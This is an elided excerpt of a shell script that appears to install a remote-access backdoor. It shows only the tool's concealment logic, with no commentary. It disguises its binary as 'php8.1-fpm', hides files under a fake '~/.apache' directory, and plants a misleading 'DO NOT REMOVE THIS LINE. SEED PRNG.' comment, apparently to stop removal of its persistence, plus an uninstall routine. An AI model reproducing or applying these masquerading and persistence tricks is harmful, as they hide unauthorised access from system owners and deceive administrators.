...
BIN_HIDDEN_NAME_DEFAULT="php8.1-fpm"
...
init_dstbin()
{
	...
	[[ ! -d "${GS_PREFIX}${HOME}/.apache" ]] && xmkdir "${GS_PREFIX}${HOME}/.apache"
	try_dstdir "${GS_PREFIX}${HOME}/.apache/${CONFIG_DIR_NAME}" && return
...
init_setup()
{
	...
	NOTE_DONOTREMOVE="# DO NOT REMOVE THIS LINE. SEED PRNG. defunct-kernel"
...
uninstall()
{
	...
	for hn in "${BIN_HIDDEN_NAME_RM[@]}"; do
		for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
			uninstall_rm "${GS_PREFIX}${HOME}/.apache/${cn}/${hn}"
			uninstall_rm "${GS_PREFIX}${HOME}/.apache/${cn}/${hn}.dat"  # SEC_NAME
		done
	...
	for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
		uninstall_rmdir "${GS_PREFIX}${HOME}/.apache/${cn}"
	done
	uninstall_rmdir "${GS_PREFIX}${HOME}/.apache"
